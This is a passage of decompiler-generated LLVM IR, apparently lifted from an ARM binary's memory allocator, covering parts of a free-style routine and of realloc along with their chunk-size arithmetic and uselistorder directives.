  %v3_ec6c = inttoptr i32 %v2_ec6c to i32*
  store i32 %v0_ec6c, i32* %v3_ec6c, align 4
  br i1 %v2_ec60, label %dec_label_pc_ecbc, label %dec_label_pc_ec74

dec_label_pc_ec74:                                ; preds = %dec_label_pc_ec40
  %v0_ec78 = load i32, i32* @r8, align 4
  %v1_ec78 = add i32 %v0_ec78, -12
  %v1_ec7c = and i32 %v1_ec78, -8
  store i32 %v3_ea44, i32* %ip.global-to-local, align 4
  %v2_ec84 = add i32 %v1_ec7c, %v3_ea44
  store i32 %v2_ec84, i32* %r1.global-to-local, align 4
  %v2_ec88 = icmp ugt i32 %v1_ec7c, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_ec90 = or i32 %v1_ec7c, 1
  store i32 %v1_ec90, i32* %r3.global-to-local, align 4
  store i32 %v1_ec90, i32* %v2_ea50, align 4
  %v0_ec98 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec98 = load i32, i32* %r1.global-to-local, align 4
  %v2_ec98 = add i32 %v1_ec98, 8
  %v3_ec98 = inttoptr i32 %v2_ec98 to i32*
  store i32 %v0_ec98, i32* %v3_ec98, align 4
  %v0_ec9c = load i32, i32* %r2.global-to-local, align 4
  %v1_ec9c = load i32, i32* %r1.global-to-local, align 4
  %v2_ec9c = add i32 %v1_ec9c, 4
  %v3_ec9c = inttoptr i32 %v2_ec9c to i32*
  store i32 %v0_ec9c, i32* %v3_ec9c, align 4
  br i1 %v2_ec88, label %dec_label_pc_eca4, label %dec_label_pc_ecbc

dec_label_pc_eca4:                                ; preds = %dec_label_pc_ec74
  %v0_eca4 = load i32, i32* @r6, align 4
  %v1_eca4 = add i32 %v0_eca4, 836
  %v2_eca4 = inttoptr i32 %v1_eca4 to i32*
  %v3_eca4 = load i32, i32* %v2_eca4, align 4
  store i32 %v3_eca4, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_ecac = load i32, i32* %ip.global-to-local, align 4
  %v1_ecac = add i32 %v0_ecac, 8
  store i32 %v1_ecac, i32* @r0, align 4
  store i32 -1, i32* %v2_eca4, align 4
  %v0_ecb4 = call i32 @free()
  store i32 %v0_ecb4, i32* %r0.global-to-local, align 4
  %v0_ecb8 = load i32, i32* @r4, align 4
  %v1_ecb8 = load i32, i32* @r6, align 4
  %v2_ecb8 = add i32 %v1_ecb8, 836
  %v3_ecb8 = inttoptr i32 %v2_ecb8 to i32*
  store i32 %v0_ecb8, i32* %v3_ecb8, align 4
  br label %dec_label_pc_ecbc

dec_label_pc_ecbc:                                ; preds = %.thread34, %dec_label_pc_ec74, %dec_label_pc_ec40, %dec_label_pc_ec38, %dec_label_pc_eca4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r0.global-to-local, align 4
  %v4_ecc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_ecc4, i32* %lr.global-to-local, align 4
  %v1_ecc8 = add i32 %v4_ecc4, 872
  store i32 %v1_ecc8, i32* %r1.global-to-local, align 4
  %v1_eccc = inttoptr i32 %v1_ecc8 to i32*
  %v2_eccc = load i32, i32* %v1_eccc, align 4
  store i32 %v2_eccc, i32* %r1.global-to-local, align 4
  %v3_eccc = add i32 %v4_ecc4, 876
  %v4_eccc = inttoptr i32 %v3_eccc to i32*
  %v5_eccc = load i32, i32* %v4_eccc, align 4
  store i32 %v5_eccc, i32* %r3.global-to-local, align 4
  %v1_ecd4 = add i32 %v4_ecc4, 868
  %v2_ecd4 = inttoptr i32 %v1_ecd4 to i32*
  %v3_ecd4 = load i32, i32* %v2_ecd4, align 4
  store i32 %v3_ecd4, i32* %r3.global-to-local, align 4
  %v1_ecd8 = add i32 %v4_ecc4, 884
  %v2_ecd8 = inttoptr i32 %v1_ecd8 to i32*
  %v3_ecd8 = load i32, i32* %v2_ecd8, align 4
  store i32 %v3_ecd8, i32* %r2.global-to-local, align 4
  %v2_ecdc = add i32 %v3_ecd4, %v2_eccc
  store i32 %v2_ecdc, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_eccc, %v5_eccc
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_ecbc
  store i32 %v2_eccc, i32* %v4_eccc, align 4
  %v0_ece4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_ece4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_ecbc, %bb165
  %v1_ece4 = phi i32 [ %v3_ecd8, %dec_label_pc_ecbc ], [ %v1_ece4.pre, %bb165 ]
  %v4_ece8 = phi i32 [ %v2_ecdc, %dec_label_pc_ecbc ], [ %v0_ece4.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_ece8, %v1_ece4
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_ece8 = load i32, i32* %lr.global-to-local, align 4
  %v6_ece8 = add i32 %v5_ece8, 884
  %v7_ece8 = inttoptr i32 %v6_ece8 to i32*
  store i32 %v4_ece8, i32* %v7_ece8, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_ecec = load i32, i32* %lr.global-to-local, align 4
  %v1_ecec = add i32 %v0_ecec, 44
  %v2_ecec = inttoptr i32 %v1_ecec to i32*
  %v3_ecec = load i32, i32* %v2_ecec, align 4
  store i32 %v3_ecec, i32* %ip.global-to-local, align 4
  %v1_ecf0 = add i32 %v3_ecec, 4
  %v2_ecf0 = inttoptr i32 %v1_ecf0 to i32*
  %v3_ecf0 = load i32, i32* %v2_ecf0, align 4
  store i32 %v1_e904, i32* %r1.global-to-local, align 4
  %v1_ecf8 = and i32 %v3_ecf0, -4
  store i32 %v1_ecf8, i32* %r3.global-to-local, align 4
  %v3_ecfc = icmp ult i32 %v1_ecf8, %v1_e904
  br i1 %v3_ecfc, label %dec_label_pc_ed28, label %dec_label_pc_ed04

dec_label_pc_ed04:                                ; preds = %bb168
  %v0_ed04 = load i32, i32* @sl, align 4
  %v2_ed04 = sub i32 %v1_ecf8, %v0_ed04
  %v2_ed08 = add i32 %v0_ed04, %v3_ecec
  store i32 %v2_ed08, i32* %r1.global-to-local, align 4
  %v1_ed0c = or i32 %v2_ed04, 1
  store i32 %v1_ed0c, i32* %r3.global-to-local, align 4
  %v1_ed10 = or i32 %v0_ed04, 1
  store i32 %v1_ed10, i32* %r2.global-to-local, align 4
  %v1_ed14 = add i32 %v3_ecec, 8
  store i32 %v1_ed14, i32* %r0.global-to-local, align 4
  store i32 %v1_ed10, i32* %v2_ecf0, align 4
  %v0_ed1c = load i32, i32* %r1.global-to-local, align 4
  %v1_ed1c = load i32, i32* %lr.global-to-local, align 4
  %v2_ed1c = add i32 %v1_ed1c, 44
  %v3_ed1c = inttoptr i32 %v2_ed1c to i32*
  store i32 %v0_ed1c, i32* %v3_ed1c, align 4
  %v0_ed20 = load i32, i32* %r3.global-to-local, align 4
  %v1_ed20 = load i32, i32* %r1.global-to-local, align 4
  %v2_ed20 = add i32 %v1_ed20, 4
  %v3_ed20 = inttoptr i32 %v2_ed20 to i32*
  store i32 %v0_ed20, i32* %v3_ed20, align 4
  br label %dec_label_pc_ed40

dec_label_pc_ed28:                                ; preds = %bb157, %bb168, %dec_label_pc_eb04
  store i32 82988, i32* %r3.global-to-local, align 4
  %v0_ed2c = call i32 @__aeabi_read_tp()
  %v3_ed30 = load i16, i16* @global_var_23164.175, align 2
  %v4_ed30 = sext i16 %v3_ed30 to i32
  store i32 %v4_ed30, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_ed38 = add i32 %v4_ed30, %v0_ed2c
  %v4_ed38 = inttoptr i32 %v3_ed38 to i32*
  store i32 12, i32* %v4_ed38, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ed40

dec_label_pc_ed40:                                ; preds = %bb151, %bb150, %dec_label_pc_ed04, %dec_label_pc_e94c, %dec_label_pc_ed28
  %v0_ed40 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ed40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ed44

dec_label_pc_ed44:                                ; preds = %.thread1, %dec_label_pc_e918, %.thread121, %dec_label_pc_e788, %dec_label_pc_e77c, %dec_label_pc_e5e4, %dec_label_pc_e568, %dec_label_pc_ed40
  store i32 %v2_e488, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 48, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r2.global-to-local, align 4
  %v4_ed54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 48) to i32*), align 4
  store i32 %v4_ed54, i32* @ip, align 4
  store i32 60768, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_ed54)
  br label %dec_label_pc_ed60

dec_label_pc_ed60:                                ; preds = %dec_label_pc_e4c0, %dec_label_pc_ed44
  %v0_ed60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ed60, i32* %r0.global-to-local, align 4
  store i32 %v3_e45c, i32* @r4, align 4
  store i32 %v6_e45c, i32* @r5, align 4
  store i32 %v9_e45c, i32* @r6, align 4
  store i32 %v12_e45c, i32* @r7, align 4
  store i32 %v15_e45c, i32* @r8, align 4
  store i32 %v18_e45c, i32* @sb, align 4
  store i32 %v21_e45c, i32* @sl, align 4
  store i32 %v24_e45c, i32* @fp, align 4
  store i32 %v27_e45c, i32* @lr, align 4
  ret i32 %v0_ed60

; uselistorder directives
  uselistorder i32 %v0_ed04, { 1, 0, 2 }
  uselistorder i32 %v3_ecec, { 1, 0, 2, 3 }
  uselistorder i32 %v4_ece8, { 1, 0 }
  uselistorder i32 %v2_eccc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_ecc4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_ec7c, { 1, 2, 0 }
  uselistorder i32 %v0_ec44, { 1, 0 }
  uselistorder i32 %v0_ec38, { 1, 0 }
  uselistorder i32 %v2_ec28, { 1, 0 }
  uselistorder i32 %v2_ebb8, { 2, 1, 0 }
  uselistorder i32 %v2_eba0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_eb98, { 1, 0, 2 }
  uselistorder i32 %v1_eb94, { 2, 1, 0 }
  uselistorder i32 %v0_eb94, { 3, 1, 2, 0 }
  uselistorder i32 %v1_eb78, { 1, 0 }
  uselistorder i32 %v2_eb50, { 1, 0 }
  uselistorder i32 %v3_eb44, { 1, 0, 2 }
  uselistorder i32 %v2_eb24, { 1, 0, 2 }
  uselistorder i32* %v2_eb1c, { 1, 0, 2 }
  uselistorder i32 %v0_eb04, { 1, 0 }
  uselistorder i32 %v6_eae0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_eacc, { 2, 1, 0 }
  uselistorder i32 %v0_eab4, { 1, 0 }
  uselistorder i32 %v2_ea70, { 1, 0, 2, 3 }
  uselistorder i32 %v1_ea6c, { 1, 0 }
  uselistorder i32 %v3_ea44, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_ea24, { 1, 0, 2 }
  uselistorder i32 %v2_ea0c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_e9b4, { 2, 1, 0 }
  uselistorder i32 %v6_e9a8, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_e984, { 2, 1, 0, 3 }
  uselistorder i32 %v3_e944, { 1, 0, 2, 3 }
  uselistorder i32 %v0_e904, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_e8fc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e8f8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_e8e4, { 1, 0 }
  uselistorder i32 %v7_e8a4, { 1, 0 }
  uselistorder i32 %v4_e8a4, { 1, 0 }
  uselistorder i32 %v0_e874, { 1, 0 }
  uselistorder i32 %v2_e848, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_e84454, { 1, 0 }
  uselistorder i32 %v1_e810, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_e7f8., { 1, 2, 0 }
  uselistorder i32 %v0_e800, { 0, 1, 3, 2 }
  uselistorder i32 %v1_e800, { 1, 0 }
  uselistorder i32 %v3_e7e0, { 1, 0 }
  uselistorder i32 %v4_e7dc, { 1, 0, 2 }
  uselistorder i32 %v1_e74c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_e7a4, { 1, 0 }
  uselistorder i32 %v1_e788, { 1, 0 }
  uselistorder i32 %v1_e628, { 1, 0 }
  uselistorder i32 %v0_e768, { 2, 0, 1, 3 }
  uselistorder i32 %v3_e730, { 2, 0, 1, 3 }
  uselistorder i32 %v0_e7c4.pre, { 1, 2, 0 }
  uselistorder i32 %v0_e70c, { 2, 1, 0 }
  uselistorder i32 %v3_e700, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_e620, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_e6c8, { 1, 0 }
  uselistorder i32 %v3_e6bc, { 1, 0 }
  uselistorder i32 %v0_e6c8, { 1, 0 }
  uselistorder i32 %v3_e6a0, { 0, 2, 3, 1 }
  uselistorder i32 %v2_e690, { 1, 0, 2 }
  uselistorder i32 %v3_e648, { 2, 1, 0 }
  uselistorder i32 %v0_e638, { 3, 2, 1, 0 }
  uselistorder i32 %v0_e608, { 1, 0 }
  uselistorder i32 %v1_e5bc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_e5b8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_e55c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_e550, { 1, 0 }
  uselistorder i32 %v3_e520, { 1, 0 }
  uselistorder i32 %v0_e514, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_e4f4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_e4e8, { 1, 0 }
  uselistorder i32 %v0_e4b8, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 101, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 1, 2, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 0, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 36, 32, 33, 1, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_ed60, { 1, 0 }
  uselistorder label %dec_label_pc_ed44, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_ed40, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_ed28, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_ecbc, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_ec38, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_ec30, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_eb04, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_ea38, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_e8f0, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_e844, { 1, 0 }
  uselistorder label %dec_label_pc_e84c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e810, { 1, 0 }
  uselistorder label %dec_label_pc_e7c4, { 1, 0 }
  uselistorder label %dec_label_pc_e758, { 1, 0 }
  uselistorder label %dec_label_pc_e754, { 1, 0 }
  uselistorder label %dec_label_pc_e700, { 1, 0 }
  uselistorder label %dec_label_pc_e6ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e6b4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e6a0, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_ed74(i32 %arg1) local_unnamed_addr {
dec_label_pc_ed74:
  %v0_ed74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ed74, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_ed74
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_ed74, %bb
  %v10_ed90 = phi i32 [ %arg1, %dec_label_pc_ed74 ], [ 0, %bb ]
  ret i32 %v10_ed90

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_ed94 = load i32, i32* @r4, align 4
  %v6_ed94 = load i32, i32* @r5, align 4
  %v9_ed94 = load i32, i32* @r6, align 4
  %v12_ed94 = load i32, i32* @r7, align 4
  %v15_ed94 = load i32, i32* @r8, align 4
  %v18_ed94 = load i32, i32* @sb, align 4
  %v21_ed94 = load i32, i32* @sl, align 4
  %v24_ed94 = load i32, i32* @fp, align 4
  %v27_ed94 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_eda0 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r2.global-to-local, align 4
  %v0_edac = load i32, i32* @r1, align 4
  store i32 %v0_edac, i32* @r6, align 4
  br i1 %v2_eda0, label %dec_label_pc_edb4, label %dec_label_pc_edc4

dec_label_pc_edb4:                                ; preds = %entry
  store i32 %v0_edac, i32* %r0.global-to-local, align 4
  %v1_edb8 = call i32 @malloc(i32 %v0_edac)
  store i32 %v1_edb8, i32* %r0.global-to-local, align 4
  store i32 %v1_edb8, i32* @r4, align 4
  br label %dec_label_pc_f124

dec_label_pc_edc4:                                ; preds = %entry
  %v2_edc4 = icmp eq i32 %v0_edac, 0
  br i1 %v2_edc4, label %dec_label_pc_edcc, label %dec_label_pc_edd8

dec_label_pc_edcc:                                ; preds = %dec_label_pc_edc4
  %v0_edcc = call i32 @free()
  store i32 %v0_edcc, i32* %r0.global-to-local, align 4
  %v0_edd0 = load i32, i32* @r6, align 4
  store i32 %v0_edd0, i32* @r4, align 4
  br label %dec_label_pc_f124

dec_label_pc_edd8:                                ; preds = %dec_label_pc_edc4
  store i32 116, i32* %r3.global-to-local, align 4
  %v4_ede0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 116) to i32*), align 4
  store i32 %v4_ede0, i32* @r4, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 %v4_ede0, i32* %r2.global-to-local, align 4
  %v4_edec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 72) to i32*), align 4
  store i32 %v4_edec, i32* %r1.global-to-local, align 4
  %v2_edf0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_edf0, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_edf8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_edf8)
  %v0_ee04 = load i32, i32* @r4, align 4
  store i32 %v0_ee04, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r1.global-to-local, align 4
  %v4_ee10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 16) to i32*), align 4
  store i32 %v4_ee10, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_ee1c.329 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_ee10)
  %v0_ee1c = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_ee1c, -32
  br i1 %tmp36, label %dec_label_pc_ee40, label %dec_label_pc_ee24

dec_label_pc_ee24:                                ; preds = %dec_label_pc_edd8
  store i32 82736, i32* %r2.global-to-local, align 4
  %v0_ee28 = call i32 @__aeabi_read_tp()
  store i32 %v0_ee28, i32* %r0.global-to-local, align 4
  %v3_ee2c = load i16, i16* @global_var_23164.175, align 2
  %v4_ee2c = sext i16 %v3_ee2c to i32
  store i32 %v4_ee2c, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_ee38 = add i32 %v4_ee2c, %v0_ee28
  %v4_ee38 = inttoptr i32 %v3_ee38 to i32*
  store i32 12, i32* %v4_ee38, align 4
  br label %dec_label_pc_f124

dec_label_pc_ee40:                                ; preds = %dec_label_pc_edd8
  %v1_ee40 = add i32 %v0_ee1c, 11
  store i32 %v1_ee40, i32* %r0.global-to-local, align 4
  %v0_ee44 = load i32, i32* @r5, align 4
  %v1_ee44 = add i32 %v0_ee44, -4
  %v2_ee44 = inttoptr i32 %v1_ee44 to i32*
  %v3_ee44 = load i32, i32* %v2_ee44, align 4
  store i32 %v3_ee44, i32* %r2.global-to-local, align 4
  %v2_ee48 = icmp ugt i32 %v1_ee40, 14
  %v7_ee48 = icmp eq i32 %v1_ee40, 15
  %v2_ee4c = xor i1 %v2_ee48, true
  %v3_ee4c = or i1 %v7_ee48, %v2_ee4c
  br i1 %v3_ee4c, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_ee40
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_ee40, %bb
  %v2_ee50 = xor i1 %v7_ee48, true
  %v3_ee50 = and i1 %v2_ee48, %v2_ee50
  br i1 %v3_ee50, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_ee50 = and i32 %v1_ee40, -8
  store i32 %v5_ee50, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_ee54 = and i32 %v3_ee44, 2
  %v2_ee54 = icmp eq i32 %v1_ee54, 0
  %v1_ee58 = add i32 %v0_ee44, -8
  store i32 %v1_ee58, i32* @sl, align 4
  %v1_ee5c = and i32 %v3_ee44, -4
  store i32 %v1_ee5c, i32* @r6, align 4
  br i1 %v2_ee54, label %dec_label_pc_ee64, label %dec_label_pc_f03c

dec_label_pc_ee64:                                ; preds = %bb29
  %v1_ee64 = load i32, i32* @sb, align 4
  %v3_ee64 = icmp ult i32 %v1_ee5c, %v1_ee64
  br i1 %v3_ee64, label %dec_label_pc_ee70, label %bb30

bb30:                                             ; preds = %dec_label_pc_ee64
  store i32 %v1_ee5c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_efd4

dec_label_pc_ee70:                                ; preds = %dec_label_pc_ee64
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_ee78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_ee78, i32* %r0.global-to-local, align 4
  %v1_ee7c = add i32 %v4_ee78, 44
  %v2_ee7c = inttoptr i32 %v1_ee7c to i32*
  %v3_ee7c = load i32, i32* %v2_ee7c, align 4
  store i32 %v3_ee7c, i32* %r3.global-to-local, align 4
  %v2_ee80 = add i32 %v1_ee5c, %v1_ee58
  store i32 %v2_ee80, i32* @r4, align 4
  %v9_ee84 = icmp eq i32 %v2_ee80, %v3_ee7c
  %v1_ee88 = add i32 %v2_ee80, 4
  %v2_ee88 = inttoptr i32 %v1_ee88 to i32*
  %v3_ee88 = load i32, i32* %v2_ee88, align 4
  store i32 %v3_ee88, i32* %r1.global-to-local, align 4
  br i1 %v9_ee84, label %dec_label_pc_ee90, label %dec_label_pc_eecc

dec_label_pc_ee90:                                ; preds = %dec_label_pc_ee70
  %v1_ee90 = and i32 %v3_ee88, -4
  %v2_ee94 = add i32 %v1_ee90, %v1_ee5c
  store i32 %v2_ee94, i32* %r1.global-to-local, align 4
  %v1_ee98 = add i32 %v1_ee64, 16
  store i32 %v1_ee98, i32* %r3.global-to-local, align 4
  %v3_ee9c = icmp ult i32 %v2_ee94, %v1_ee98
  br i1 %v3_ee9c, label %dec_label_pc_ef20, label %dec_label_pc_eea4

dec_label_pc_eea4:                                ; preds = %dec_label_pc_ee90
  %v2_eea4 = sub i32 %v2_ee94, %v1_ee64
  %v1_eea8 = urem i32 %v3_ee44, 2
  %v2_eeac = add i32 %v1_ee64, %v1_ee58
  store i32 %v2_eeac, i32* %r1.global-to-local, align 4
  %v2_eeb0 = or i32 %v1_ee64, %v1_eea8
  store i32 %v2_eeb0, i32* %r2.global-to-local, align 4
  %v1_eeb4 = or i32 %v2_eea4, 1
  store i32 %v1_eeb4, i32* %r3.global-to-local, align 4
  store i32 %v0_ee44, i32* @r4, align 4
  store i32 %v2_eeb0, i32* %v2_ee44, align 4
  %v0_eec0 = load i32, i32* %r1.global-to-local, align 4
  %v1_eec0 = load i32, i32* %r0.global-to-local, align 4
  %v2_eec0 = add i32 %v1_eec0, 44
  %v3_eec0 = inttoptr i32 %v2_eec0 to i32*
  store i32 %v0_eec0, i32* %v3_eec0, align 4
  %v0_eec4 = load i32, i32* %r3.global-to-local, align 4
  %v1_eec4 = load i32, i32* %r1.global-to-local, align 4
  %v2_eec4 = add i32 %v1_eec4, 4
  %v3_eec4 = inttoptr i32 %v2_eec4 to i32*
  store i32 %v0_eec4, i32* %v3_eec4, align 4
  br label %dec_label_pc_f108

dec_label_pc_eecc:                                ; preds = %dec_label_pc_ee70
  %v1_eecc = and i32 %v3_ee88, -2
  %v2_eed0 = add i32 %v1_eecc, %v2_ee80
  store i32 %v2_eed0, i32* %r3.global-to-local, align 4
  %v1_eed4 = add i32 %v2_eed0, 4
  %v2_eed4 = inttoptr i32 %v1_eed4 to i32*
  %v3_eed4 = load i32, i32* %v2_eed4, align 4
  store i32 %v3_eed4, i32* %r3.global-to-local, align 4
  %v1_eed8 = urem i32 %v3_eed4, 2
  %v2_eed8 = icmp eq i32 %v1_eed8, 0
  br i1 %v2_eed8, label %dec_label_pc_eee0, label %dec_label_pc_ef20

dec_label_pc_eee0:                                ; preds = %dec_label_pc_eecc
  %v1_eee0 = and i32 %v3_ee88, -4
  store i32 %v1_eee0, i32* %r3.global-to-local, align 4
  %v2_eee4 = add i32 %v1_eee0, %v1_ee5c
  store i32 %v2_eee4, i32* %r0.global-to-local, align 4
  %v3_eee8 = icmp ult i32 %v2_eee4, %v1_ee64
  br i1 %v3_eee8, label %dec_label_pc_ef20, label %dec_label_pc_eef0

dec_label_pc_eef0:                                ; preds = %dec_label_pc_eee0
  %v1_eef0 = add i32 %v1_ee5c, %v0_ee44
